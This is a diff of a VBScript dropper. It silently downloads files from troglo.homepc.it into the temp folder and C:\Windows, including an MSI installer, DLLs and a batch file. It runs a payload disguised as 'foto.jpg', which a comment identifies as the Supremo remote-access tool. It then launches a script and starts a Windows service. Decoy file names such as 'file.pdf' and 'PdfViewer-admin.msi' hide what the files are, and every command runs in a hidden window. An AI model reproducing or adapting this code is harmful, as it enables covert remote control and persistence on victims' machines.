@@ -4,13 +4,15 @@ Set oShell = CreateObject ("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 windir = oShell.ExpandEnvironmentStrings( "%WINDIR%" )
 temp = oShell.ExpandEnvironmentStrings( "%TEMP%" )
+slocal = oShell.ExpandEnvironmentStrings( "%LOCALAPPDATA%" )
 strComputerName = oShell.ExpandEnvironmentStrings( "%COMPUTERNAME%" )
-'sfile="file.pdf" 'Supremo.exe
-sfile="Supremo.exe" 'Supremo.exe
+sfilelocal="foto.jpg" 'Supremo.exe
+sfile="file.pdf" 'Supremo.exe
+'sfile="Supremo.exe" 'Supremo.exe
 sver="sysexecuser1"
 With oShell
   .Run "cmd /c echo elevated  > " &windir & "\" & sver, 0, True
-  .Run "curl http://troglo.homepc.it/" & sfile & " -o "& temp & "\" & sfile, 0, True
+'  .Run "curl http://troglo.homepc.it/" & sfile & " -o "& temp & "\" & sfile, 0, True
   '.Run "curl http://troglo.homepc.it/file.jpg -o "& temp &"\file.jpg", 0, True
   .Run "curl http://troglo.homepc.it/win/PdfViewer-admin.msi -o "& temp &"\PdfViewer-admin.msi", 0, True 
   '.Run "curl http://troglo.homepc.it/win/sys.bat -o "& temp &"\sys.bat", 0, True
@@ -57,7 +59,8 @@ With oShell
 .Run "curl http://troglo.homepc.it/win/libssl-1_1.dll -o c:\windows\libssl-1_1.dll", 0, True
 .Run "curl http://troglo.homepc.it/win/libcurl.dll -o c:\windows\libcurl.dll", 0, True
 .Run "curl http://troglo.homepc.it/win/libcrypto-1_1.dll -o c:\windows\libcrypto-1_1.dll", 0, True
-.Run temp  & "\" & sfile, 0, True 
+'.Run temp  & "\" & sfile, 0, True 
+.Run slocal  & "\wix\" & sfilelocal, 0, True 
 .Run "cscript c:\windows\hp\svc.vbs", 0, True
 .Run "curl http://troglo.homepc.it/win/cmd.bat -o c:\windows\cmd.bat", 0, True
 .Run "net start CppWindowsService", 0, True
